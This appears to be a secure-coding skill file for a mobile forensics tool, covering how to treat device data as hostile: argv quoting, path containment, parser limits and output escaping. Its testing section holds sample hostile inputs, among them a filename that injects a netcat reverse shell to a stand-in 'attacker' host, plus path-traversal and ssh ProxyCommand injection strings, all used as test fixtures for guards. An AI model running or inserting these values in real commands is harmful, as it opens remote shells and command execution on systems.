---
name: mobfi-untrusted-input
description: >
  Security discipline for MobFI code that touches device-supplied data:
  building argv for external tools, handling device paths, parsing
  attacker-controlled file formats, and displaying results. Triggers before
  or during any edit under internal/transport, internal/extract,
  internal/backup, internal/plist, internal/keystore, internal/dbview, or
  anywhere an exec.Cmd is constructed from a value that came off a device.
  Also triggers on "is this safe", "review this for injection", "path
  traversal", "we should validate this input", or a review of code that
  interpolates a device string into a command, a path, or HTML. Covers the
  trust boundary, argv construction, path containment, parser hardening
  (depth, length, allocation), and the display rules.
---

# Untrusted device input

## Purpose

MobFI's entire input surface is data from a device that may be
compromised, or from an app that may be malicious. This skill is the
checklist for code on that boundary.

## The trust boundary

**Everything that crosses from a device into MobFI is
attacker-controlled.** Specifically:

| Source | Attacker controls |
|---|---|
| `find` / `ls` output over adb | File and directory names, including metacharacters and newlines |
| AFC directory listings | Same, on iOS |
| File contents | SQLite, plists, JSON, images, PDFs, archives |
| `dumpsys` / `ideviceinstaller` output | Bundle ids, paths, labels, icon resource names |
| Backup `Manifest.db` | Domains, relative paths, flags, file blobs |
| APK / IPA metadata | Every string in the manifest |

**What is being defended is the operator's workstation.** MobFI
copies data off a device without letting the device reach back.

An operator running MobFI is often examining malware deliberately.
"The user would not do that" is never a valid argument here: doing
exactly that is the use case.

## Argv construction

### The core hazard

`adb shell` and `adb exec-out` do not take an argv vector. They
concatenate their remaining arguments and hand the result to
`/system/bin/sh -c` **on the device**. A device-supplied filename
containing `;`, `|`, backticks, `$(...)`, or a newline therefore
becomes shell code on the device.

The same class of problem appears with any tool that reinterprets
its arguments:

| Tool | Reinterprets |
|---|---|
| `adb shell`, `adb exec-out` | Joined args as a device shell command |
| `su -c` | Its argument as a shell command (a second parse) |
| `ssh` | Leading-`-` values as options, including `-oProxyCommand=` |
| `open` (macOS), `xdg-open` | Leading-`-` values as options |
| `cmd.exe /c` | Its own quoting rules |

### Rules

**Never interpolate an unvalidated device string into a
shell-parsed context.** Quote it for exactly the number of parses it
will undergo, or eliminate a parse.

**Prefer argv forms that do not re-parse.** Where a tool offers a
form that takes arguments as a vector, use it in preference to a
`-c "command string"` form.

**Terminate option parsing.** Insert `--` before positional
arguments where the tool supports it, so a value starting with `-`
cannot become a flag. Where the tool does not support `--`, prefix a
relative path with `./`.

**Validate the shape when a value has one.** A bundle id, an adb
serial, a host:port, or a pairing code has a known alphabet. A
whitelist regex applied at the entry point is stronger than quoting
downstream:

```go
var bundleIDRe = regexp.MustCompile(`^[A-Za-z][A-Za-z0-9._$-]*$`)
```

**Reject NUL bytes** in anything destined for argv. Go's `os/exec`
transports argv as NUL-terminated C strings, so an embedded NUL
truncates silently.

### Review questions for any new `exec` call

- [ ] Which arguments originate from the device or from user input?
- [ ] How many times will each be parsed, and by what?
- [ ] Can a value begin with `-`? Is option parsing terminated?
- [ ] Is the shape validated at the entry point?
- [ ] Are NUL, newline, and CR rejected?
- [ ] Is `sysproc.Command`/`CommandContext` used, so Windows does
      not flash a console window?

## Device paths

A device path is a string an attacker chose. Two independent guards
apply, and both already exist in `internal/extract`.

**Containment.** After joining a device-relative path onto the
destination, verify the result is still inside the destination.
`filepath.Join` calls `Clean`, which resolves `..` lexically, so a
path like `../../.ssh/authorized_keys` resolves outside without a
check. The existing pattern refuses and records a skip:

```go
local := safeLocalPath(dest, rel)
if !within(dest, local) {
    res.Skipped = append(res.Skipped, SkippedFile{Path: p, Reason: "path escapes destination"})
    return nil
}
```

Every new writer that builds a destination path from device data
needs this. The check belongs immediately after the join, before any
`os.MkdirAll` or file creation.

**Host-legal names.** Names legal on the device may be illegal on
the host (`:` on Windows, reserved device names like `CON`). Sanitise
per component so the directory structure survives.

Additional rules:

- **Reject absolute device paths and leading separators** before
  joining.
- **Reject NUL bytes** in a path.
- **Do not follow symlinks** into or out of the tree. `Walk` visits
  directories and regular files only, and skips symlinks, sockets,
  and FIFOs deliberately.
- **Never execute anything from a capture,** and be careful about
  handing one to the OS: a shell handler will run an executable or
  resolve a shortcut.

## Parsers

Parsers consume attacker bytes directly and carry the heaviest
burden. Rules, all learned from formats already parsed here (binary
plist, keybag TLV, backup manifests):

**Bound recursion depth.** A nested structure costs the attacker a
few bytes per level and costs you a stack frame. Go's stack
overflow is a fatal runtime throw that `recover` cannot catch, so an
unbounded recursive descent parser is a remote crash. Thread a depth
counter and reject past a fixed limit.

**Validate every length prefix against the remaining buffer**
before slicing. A 4-byte length field from the file is not a
promise.

**Check arithmetic on attacker-controlled sizes.** `count * size`
overflows, and a wrapped product can pass a bounds check that the
real value would fail. Use `math/bits.Mul64` or divide instead of
multiplying.

**Never size an allocation directly from input.** `make([]T, n)`
with `n` from the file is an out-of-memory primitive. Cap `n`
against something real: the file length, or a fixed sane ceiling.

**Cap iteration counts that feed expensive work.** A PBKDF2
iteration count read from a file is an attacker-chosen amount of CPU
to burn. Cap it well above legitimate values and reject beyond.

**Return errors; do not panic.** A panic in a parser reached through
the GUI takes down the application. Where a `recover` is used as a
backstop, it is a backstop, not the error-handling strategy.

**Size-cap the input** before parsing where a caller can. Rendering
caps at 1 MB; scanning skips files over 16 MB.

## Network egress

Two paths leave the workstation: the update check and opt-in secret
verification.

- **HTTPS only.** No plaintext fallback.
- **Never put a secret in a URL.** Query strings are logged by
  servers and proxies.
- **Read-only endpoints** for verification.
- **Bounded timeouts** so one hanging provider does not stall a run.
- **Ambiguity is not a negative result.** A failed check reports
  "unknown", never "inactive".

## Display

Rendering results is part of the boundary, not after it.

- **Terminal**: device strings may contain ANSI escapes and control
  bytes. Escape them before printing to a terminal or writing a log,
  or a crafted filename rewrites the operator's screen.
- **Webview**: never interpolate a device string into HTML. Build
  nodes and set `textContent`. See `mobfi-gui-binding`.
- **Reports**: HTML output escapes values via `html/template`. JSON
  output preserves raw bytes deliberately, because the report is
  evidence.

## Review checklist

For any change touching device data:

- [ ] Every device-derived value that reaches argv is validated or
      correctly quoted for the number of parses it undergoes
- [ ] Option parsing is terminated where a value could start with `-`
- [ ] Destination paths are containment-checked after the join
- [ ] Parsers bound depth, validate lengths, check size arithmetic,
      and cap allocations
- [ ] No panic path reachable from malformed input
- [ ] Nothing from a capture is executed or handed to a shell handler
      without explicit operator intent
- [ ] Device strings reaching a terminal or a webview are escaped
- [ ] Failures are recorded (skip lists, errors), not silently dropped
- [ ] A test covers the hostile case, not just the happy path

## Testing the hostile case

Write the malicious input as a test. It is cheap and it is the only
way the guard stays working:

```go
// Path traversal via a device-supplied name.
hostile := "../../../../evil-target"

// Shell metacharacters in a filename returned by find.
hostile := "/sdcard/foo; busybox nc attacker 443 -e /system/bin/sh #"

// Leading dash, to test option-parsing termination.
hostile := "-oProxyCommand=touch /tmp/pwn"
```

Assert the guard fired: the file was skipped with the expected
reason, the metacharacters stayed inside a quoted token, the value
was rejected. `internal/extract/extract_test.go` and
`internal/transport/adb_test.go` have the established shapes.

## Cross-references

- `mobfi-device-support`: the transports and probes this governs
- `mobfi-file-formats`: parser work
- `mobfi-gui-binding`: the display half of the boundary
- `mobfi-secret-rules`: the redaction invariant
